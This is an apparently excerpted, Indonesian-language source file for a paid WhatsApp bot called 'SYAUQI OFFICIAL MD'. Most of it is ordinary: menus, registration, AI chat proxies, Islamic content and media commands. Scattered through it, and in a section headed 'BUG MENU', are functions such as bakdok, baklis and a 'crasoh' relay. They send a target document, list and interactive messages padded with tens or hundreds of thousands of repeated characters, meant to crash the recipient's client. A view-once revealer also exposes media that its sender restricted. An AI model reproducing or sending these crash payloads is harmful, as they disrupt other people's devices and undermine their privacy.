...
//==================《 TEMPAT CONST LIB 》=====================\\
const { smsg, fetchJson, getBuffer, formatp, fetchBuffer, getGroupAdmins, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
...
newsletterName: "SYAUQI OFFICIAL MD V1.6",
...
message: {
listResponseMessage: {
title: `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ`
}
}
}
const force = {
...
"𝑺𝒄 𝑷𝒓𝒊𝒗𝒂𝒕𝒆",
"𝑩𝒚 𝑭𝒂𝒍𝒍𝒁𝒙",
"SYAUQI OFFICIAL 𝑴𝑫 | 𝑩𝒚 SYAUQI OFFICIAL"
]
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ︎`+"ྦྷ".repeat(60000),
...
                    },
                    body: {
                        text: "SYAUQI OFFICIAL|ʙʏ SYAUQI OFFICIAL" + "源".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "࿋ོ༙SYAUQI OFFICIAL 𝑴𝒅𝒛 ཽ ྀ"+" ".repeat(920000),
        'footerText': `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ︎`,
        'description': `ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ︎`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://whatsapp.com/channel/0029VahKGBA1SWt8zuWjNx44", 
"sourceUrl": "https://whatsapp.com/channel/0029VahKGBA1SWt8zuWjNx44" }}}, { quoted: m }) }
...
async function IsReg() {
  let cap = `SYAUQI OFFICIAL ɴᴏᴛ ᴀᴄᴄᴇss\nᴅᴀғᴛᴀʀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴋᴀᴋ. \n\nᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :\n.daftar syauqi.20`
     ...
     isForwarded: true, 
      forwardedNewsletterMessageInfo: {
       newsletterJid: idsaluran2,
        newsletterName: `Register By: ${pembuat}`, 
         serverMessageId: -1
         },
...
encodedParams.set('hd', '1');
      ...
      const response = await axios({
        ...
        headers: {
          ...
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Syauqi/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
  ...
  try {
    const copyResponse = await fetch(`${apiUrl}/api/copySite`, {
      ...
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Syauqi/128.0.0.0 Mobile Safari/537.36",
...
sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ sɪᴍᴘʟᴇ ᴍᴇɴᴜ \`SYAUQI OFFICIAL ᴍᴅ\`. ʏᴀɴɢ ᴅɪʀᴀɴᴄᴀɴɢ ᴏʟᴇʜ \`SYAUQI OFFICIAL MD - SYAUQI OFFICIAL\`, sᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ʀᴀᴍᴀʜ ᴅᴀɴ ʟᴜᴄᴜ 🙂‍↕. 

✧┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ INFO BOT* ]
> ɴᴀᴍᴀ   : SYAUQI OFFICIAL ᴍᴅ
> ᴏᴡɴᴇʀ  : SYAUQI OFFICIAL
> ᴠᴇʀꜱɪ   :  ${versinya}
✧┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
┏─❣︎ 「 *\`OWNER MENU\`* 」 ❣︎──⪩
┃ • ${prefix}owner
...
sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ sɪᴍᴘʟᴇ ᴍᴇɴᴜ \`ʜɪʟʟᴀʀʏ ᴍᴅ\`. ʏᴀɴɢ ᴅɪʀᴀɴᴄᴀɴɢ ᴏʟᴇʜ \`SYAUQI OFFICIAL MD - SYAUQI OFFICIAL\`, sᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ʀᴀᴍᴀʜ ᴅᴀɴ ʟᴜᴄᴜ 🙂‍↕. 
...
ɢᴜɴᴀᴋᴀɴ ᴍᴇɴᴜ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ ʏᴀ 👋`  
Lily.sendMessage(m.chat, {audio: fs.readFileSync(`./img/hillary.mp3`)})
let msg = generateWAMessageFromContent(from, {
                    ...
                    message: {
                        ...
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `ʜᴀʟᴏ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ sɪᴍᴘʟᴇ ᴍᴇɴᴜ *\`SYAUQI OFFICIAL MD\`*`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "SYAUQI OFFICIAL ᴀʙɪɢᴀɪʟ"
                            }),
                            ...
                            },
                            {
                                ...
                                buttonParamsJson: JSON.stringify({
                                    ...
                                    url: "https://youtube.com/@sauqimedia",
                                    merchant_url: "https://youtube.com/@sauqimedia"
                                })        
                                }, 
                               {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    ...
                                    url: "https://whatsapp.com/channel/0029VahKGBA1SWt8zuWjNx44",
                                    merchant_url: "https://whatsapp.com/channel/0029VahKGBA1SWt8zuWjNx44"
                                })
                            }
                        ]
                                        })
            ...
            messageId: msg.key.id
                ...
                await Lily.sendMessage(m.chat, {
                  audio: fs.readFileSync('./img/hillary.mp3'),
                  mimetype: 'audio/mpeg',
                  ptt: true
              }, {
                  quoted: m
        ...
        if (user.registered) {
            return reply("```ɴɢᴀᴘᴀɪɴ ᴅᴀғᴛᴀʀ ʟᴀɢɪ ᴅᴀʜ\nᴋᴀɴ ᴜᴅᴀʜ ᴋᴇᴅᴀғᴛᴀʀ```")
                  ...
                  let match = teks.match(Reg)
                      if (!match) return reply(`*\`SYAUQI OFFICIAL\`* ɴᴏᴛ ᴀᴄᴄᴇss\nᴅᴀғᴛᴀʀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴋᴀᴋ.\n\nᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :\n.daftar syauqi.20`)    
                          let [name, age] = match
                              if (!name.trim()) return reply('ᴍᴀsᴜᴋᴀɴ ɴᴀᴍᴀ ᴍᴜ ᴅᴇɴɢᴀɴ ʙᴇɴᴀʀ')
                                  if (!age) return reply('ᴜᴍᴜʀ ᴍᴜ ʙᴇʀᴀᴘᴀ ɴɪᴄʜ?')    
                                      age = parseInt(age)
                                          if (age > 30) return reply('*[ SYAUQI OFFICIAL ]* ᴡᴀʜ ᴜᴍᴜʀ ᴋᴀᴍᴜ ᴜᴅᴀʜ ᴛᴜᴀ ʏᴀ 😅 ')
                                              if (age < 5) return reply('*[ SYAUQI OFFICIAL ]* ᴡᴀʜ ᴀᴅᴀ ᴀᴅɪᴋ ᴋᴇʟᴀs ᴋᴜ ɴɪʜ , sᴜɴɢᴋᴇᴍ ᴅᴜʟᴜ sᴀᴍᴀ sᴇᴘᴜʜ')    
                                                  user.name = name.trim()
                                                      user.age = age
                                                              ...
                                                              user.registered = true
                                                                  user.sn = generateRandomPassword()    
                                                                      let sn = crypto.createHash("md5").update(m.sender).digest("hex")
                                                                          let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.fromMe ? Lilyuser.jid : m.sender
...
case 'p': {
  reply(`Maaf Kak ${pushname} , Hendaknya Mengucapkan Salam`)
}
break;

case 'backup': {
if (!isCreator) return reply(mess.owner); 
let jir = m.mentionedJid[0] || m.sender || Lily.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await reply(`*\`ʜɪʟʟᴀʀʏʏᴏᴜʀs\`* ʙᴀᴄᴋᴜᴘ ᴀᴋᴀɴ sᴇɢᴇʀᴀ ᴅɪᴍᴜʟᴀɪ`);
const { execSync } = require("child_process");
 ...
 pe != "yarn.lock" &&
 pe != "" );
 await reply(`*\`ʜɪʟʟᴀʀʏʏᴏᴜʀs\`*:\n\nʙᴀᴄᴋᴜᴘ ᴘʀᴏsᴇs sᴇʟᴇsᴀɪ,ғɪʟᴇ ᴀᴋᴀɴ ᴅɪᴛᴇʀɪᴍᴀ ᴍᴇʟᴀʟᴜɪ ᴄʜᴀᴛ ᴘʀɪʙᴀᴅɪ`)
 const exec = await execSync(`zip -r LilyV1.8 ${ls.join(" ")}`);
 await Lily.sendMessage(jir, {
 document: await fs.readFileSync("./Lily1.8.zip"),
 mimetype: "application/zip",
 fileName: "LilyV1.8.zip",
 },
 {quoted: LilyUp});
 await execSync("rm -rf Lily1.8.zip");
 }
        break
case 'infoip':{
...
case 'ping':
        ...
        case 'kisahnabi': {
             if (!text) return reply(`*\`SYAUQI OFFICIAL ɪsʟᴀᴍɪᴄ\`*\n\nᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} adam`)
...
const asmaulhusna = [
    ...
    if (isNaN(args[0])) return reply (`*\`SYAUQI OFFICIAL ɪsʟᴀᴍɪᴄ\`*\n\nᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} 1`)
    if (args[0]) {
...
Lily.Hillaryours = Lily.Hillaryours ? Lily.Hillaryours : {};
    ...
    if (text === "on") {
        ...
        m.reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ ʙᴏᴛ *\`SYAUQI OFFICIAL\`* :\nᴛᴇʟᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ [ √ ]\nɢᴜɴᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ ʏᴀ ᴋᴀᴋ 🙂‍↕`);
    } else if (text === "off") {
...
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    ...
    if (/video/.test(type)) {
        ...
        case "cekidch": case "idch": {
          if (!text) return reply("Harap masukkan link channel WhatsApp.");
          if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid.");
      
          try {
              let result = text.split('https://whatsapp.com/channel/')[1];
              
              // Verifikasi apakah Lily dan metode tersedia
              if (!Lily || typeof Lily.newsletterMetadata !== "function") {
                  return reply("Fungsi 'newsletterMetadata' tidak ditemukan. Pastikan konfigurasi sudah benar.");
              }
      
              let res = await Lily.newsletterMetadata("invite", result);
              
              if (!res) return reply("Data channel tidak ditemukan atau link tidak valid.");
              ...
              *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Tidak"}
              ...
              console.error("Error:", error);
              return reply("Terjadi kesalahan saat memproses permintaan Anda. Silakan coba lagi.");
          }
      }
...
〆 ʟɪɴᴋ ᴄʜ
https://whatsapp.com/channel/0029VahKGBA1SWt8zuWjNx44`)
await sleep(2000)
sendReaction("🐉")
}
...
if (!isBotRegistered) return reply(mess.security);   
    ...
    case "brat": {
          if (!text) return reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʜɪʟʟᴀʀʏᴏᴜʀs\`*:\n${command} halo suki`) 
                                               try {
...
if (!isBotRegistered) return reply(mess.security);
   ...
   let ouh = await fetch(`https://server.apisanz.my.id/download/spotifydl?text=${encodeURIComponent(text)}`)
    let gyh = await ouh.json() 
    let hallo = ` Judul: ${gyh.data.title}\nUrl: ${text}`             
          await Lily.sendMessage(
              m.chat, 
              { audio: { url: gyh.data.url }, mimetype: 'audio/mpeg', ptt: true }, 
              { quoted: LilyUp }
          );
  }
        break
...
{
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"Copy Url Web\",\"id\":\"123456789\",\"𝒀𝒕 YT SAUKI OFFICIAL\":\"https://myportfolio-nu-dusky.vercel.app\"}"
 },
 ],
 })
 })
...
Lily.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: LilyUp })
}
        break
...
case 'toanime2':
case  'jadianime2':{
if (!quoted) return m.reply(`mana Fotonya kak?`)
reply(mess.wait)
const media = await Lily.downloadAndSaveMediaMessage(quoted)
const anu = await  uploadUguu(media)
Lily.sendMessage(m.chat, { image: { url: `https://api.zenkey.my.id/api/maker/toanime?apikey=zenkey&url=${anu}`}, caption: `Sukses membuat Anime\n${xtime}`}, { quoted: m})
}
        break
...
break
case 'first-rabbit': {
const Falldev = await getBuffer(`https://github.com/FallEzz/Set-List-Original-JKT48-By-FallZx/tree/4b9d8c21453c82d1b4e56e3368391d108b255d25/Mahagita%20-%20Kamikyokutachi/First Rabbit.mp3`)
await Lily.sendMessage(m.chat, { audio: Falldev, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })     
}
break
case 'gadis-remaja': {
const Falldev = await getBuffer(`https://github.com/FallEzz/Set-List-Original-JKT48-By-FallZx/tree/4b9d8c21453c82d1b4e56e3368391d108b255d25/Mahagita%20-%20Kamikyokutachi/Gadis Remaja.mp3`)
await Lily.sendMessage(m.chat, { audio: Falldev, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })     
}
//==================《 BUG MENY DISINI 》======================\\
        break;
					...
					const crasoh = await Lily.relayMessage(jid,
						{
							extendedTextMessage: {
								...
								description: 'SYAUQI OFFICIAL | SYAUQI OFFICIAL 𝑴𝑫',
								title: 'SYAUQI OFFICIAL 𝑴𝑫 | 𝑩𝒚 YT SAUKI OFFICIAL',
								textArgb: 0xff000000,
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ︎"
    },
    "footer": {
      "text": "›          # SYAUQI OFFICIAL"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ SYAUQI OFFICIAL ᴍᴅ"
    },
    "footer": {
      "text": "›          # SYAUQI OFFICIAL"
    },
...
name: "cta_url",
buttonParamsJson: `{
display_text: '𝒀𝑻 : YT SAUKI OFFICIAL',
url: "${global.websitex}",
...
ᴏᴡɴᴇʀ = .ᴏᴡɴᴇʀ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
ʜᴀʀɢᴀ sᴄʀɪᴘᴛ ɪɴɪ 35.000 sᴀᴛᴜᴀɴ ʏᴀᴋ
ғʀᴇᴇ ᴜᴘᴅᴀᴛᴇ ᴠ1.9 ʜᴀʀɢᴀ 85.000`
reply(teks) 
}
        break
case "qrispay": {
...
case 'biji': {
	...
	let prompt = `Ubah gaya bicaramu dengan bahasa yang singkat, Namamu adalah ${pushname}\n,Ubah Kata Kamu menjadi "Lu" Dan Aku Menjadi "gua" Kata penyapamu adalah dengan menyebut ngab, kamu memiliki owner nama ownermu adalah ${pushname}\n➸ *Name owner* atau biasa di panggil Dengan sebutan "SYAUQI OFFICIAL",Ubah bahasamu menggunakan bahasa Yang Lembut Dan Sopan, Bahasa Mu menggunakan Bahasa yang gaul dan singkat, kamu memiliki sifat seperti Perempuan dan Sopan, Jika ada yang menanyakan tentang Lily kamu marah` //You can change the prompt as you like
	let burassa = await fetchJson(`https://btch.us.kg/prompt/gpt?prompt=${prompt}&text=${text}`)
	Lily.sendMessage(m.chat, {
		text: `${burassa.result}`
	}, {
		quoted: m
...
case 'hillary-image':{
  ...
  case 'logic-ai': {
    ...
    try {
        ...
        let response = await fetchJson(`https://btch.us.kg/feloai?text=${encodeURIComponent(text)}`);

        // Pastikan respons memiliki format yang diharapkan
        if (response && response.result && response.result.answer) {
            let ans = response.result.answer; // Mengakses jawaban
...
let messages = [];
  try {
    ...
    let response = await fetch(`https://server.apisanz.my.id/ai/metaai?text=${encodeURIComponent(text)}`);
...
let messages = [];
  try {
    ...
    if (!text) return reply(`Hillayours disini ,mau tanya apa?`);
    let response = await fetch(`https://server.apisanz.my.id/ai/gptturbo?text=${encodeURIComponent(text)}`);
    if (!response.ok) {
      throw new Error("Request to OpenAI API failed");
    }
...
Lily.Hillaryours = Lily.Hillaryours ? Lily.Hillaryours : {};
    ...
    // auto respon  (Ai)
const botNumber2 = "62882008756433@s.whatsapp.net"; //nomer bot
const mentionedJidList = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
if (m.isGroup && (mentionedJidList?.includes(botNumber2) || (m.quoted && m.quoted.sender === botNumber2))) {
if (isBanned.includes(m.sender)) {
return;
}
const ignoredKeywords = ['delete', 'd', 'hapus'];
if (ignoredKeywords.includes(m.text?.toLowerCase().trim())) {
return;
}
Lily.sendMessage(from, { react: { text: "🧐", key: m.key } });
const prompt = `Namamu adalah (nama bot lu) kamu diciptakan oleh (nama owner), kamu memiliki sifat yang ramah dan baik hati, hal yang kamu sukai adalah menolong orang`;
const requestData = { content: text || "Hai", user: m.sender, prompt: prompt };
const quoted = m && (m.quoted || m);
try {
let response;
const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;
